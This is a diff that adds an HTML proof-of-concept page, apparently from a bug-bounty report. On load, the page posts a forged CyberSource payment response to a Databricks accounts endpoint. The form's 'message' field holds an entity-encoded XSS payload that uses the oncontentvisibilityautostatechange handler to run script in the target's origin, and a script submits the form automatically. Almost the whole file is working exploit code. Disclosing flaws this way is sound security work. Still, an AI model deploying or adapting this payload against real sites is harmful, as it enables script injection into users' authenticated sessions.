@@ -1,0 +1,75 @@
+<html>
+<body>
+    <form action="https://accounts.cloud.databricks.com/api/2.0/accounts/37d9cf6b-69b7-42ba-b928-91b9898a222a/subscriptions/4512b9e0-7783-4575-a282-4f945de929bc/cybersource-response-mediator" method="POST">
+      <input type="hidden" name="utf8" value="1" />
+      <input type="hidden" name="req_locale" value="1" />
+      <input type="hidden" name="score_score_result" value="1" />
+      <input type="hidden" name="decision_active_profile_selector_rule" value="1" />
+      <input type="hidden" name="req_bill_to_surname" value="1" />
+      <input type="hidden" name="req_card_expiry_date" value="1" />
+      <input type="hidden" name="score_rflag" value="1" />
+      <input type="hidden" name="score_card_issuer" value="1" />
+      <input type="hidden" name="score_rcode" value="1" />
+      <input type="hidden" name="card_type_name" value="1" />
+      <input type="hidden" name="req_payment_method" value="1" />
+      <input type="hidden" name="decision_early_return_code" value="1" />
+      <input type="hidden" name="transaction_id" value="1" />
+      <input type="hidden" name="req_card_type" value="1" />
+      <input type="hidden" name="req_override_custom_receipt_page" value="1" />
+      <input type="hidden" name="score_address_info" value="1" />
+      <input type="hidden" name="score_factors" value="1" />
+      <input type="hidden" name="score_model_used" value="1" />
+      <input type="hidden" name="req_bill_to_address_country" value="1" />
+      <input type="hidden" name="decision_rmsg" value="1" />
+      <input type="hidden" name="req_profile_id" value="1" />
+      <input type="hidden" name="score_suspicious_info" value="1" />
+      <input type="hidden" name="decision_rcode" value="1" />
+      <input type="hidden" name="score_rmsg" value="1" />
+      <input type="hidden" name="decision_rflag" value="1" />
+      <input type="hidden" name="signed_date_time" value="1" />
+      <input type="hidden" name="req_bill_to_address_line1" value="1" />
+      <input type="hidden" name="req_card_number" value="1" />
+      <input type="hidden" name="score_ip_country" value="1" />
+      <input type="hidden" name="signature" value="1" />
+      <input type="hidden" name="score_card_scheme" value="1" />
+      <input type="hidden" name="score_ip_routing_method" value="1" />
+      <input type="hidden" name="score_bin_country" value="1" />
+      <input type="hidden" name="req_bill_to_address_city" value="1" />
+      <input type="hidden" name="req_bill_to_address_postal_code" value="1" />
+      <input type="hidden" name="score_reason_code" value="1" />
+      <input type="hidden" name="reason_code" value="1" />
+      <input type="hidden" name="req_bill_to_forename" value="1" />
+      <input type="hidden" name="request_token" value="1" />
+      <input type="hidden" name="score_card_account_type" value="1" />
+      <input type="hidden" name="req_amount" value="1" />
+      <input type="hidden" name="req_bill_to_email" value="1" />
+      <input type="hidden" name="req_currency" value="1" />
+      <input type="hidden" name="decision" value="1" />
+      <input type="hidden" name="decision_return_code" value="1" />
+      <input type="hidden" name="req_merchant_descriptor" value="1" />
+
+      <!-- XSS here -->
+      <input type="hidden" name="message" value="test&apos;&#32;oncontentvisibilityautostatechange&#61;alert&#40;document.domain&#41;&#32;style&#61;&apos;content&#45;visibility&#58;auto" />
+
+      <input type="hidden" name="signed_field_names" value="1" />
+      <input type="hidden" name="req_transaction_uuid" value="1" />
+      <input type="hidden" name="decision_reason_code" value="1" />
+      <input type="hidden" name="score_time_local" value="1" />
+      <input type="hidden" name="score_return_code" value="1" />
+      <input type="hidden" name="score_host_severity" value="1" />
+      <input type="hidden" name="req_transaction_type" value="1" />
+      <input type="hidden" name="req_access_key" value="1" />
+      <input type="hidden" name="score_internet_info" value="1" />
+      <input type="hidden" name="decision_early_reason_code" value="1" />
+      <input type="hidden" name="req_reference_number" value="1" />
+      <input type="hidden" name="decision_active_profile" value="1" />
+      <input type="hidden" name="req_bill_to_address_state" value="1" />
+      <input type="hidden" name="decision_early_rcode" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
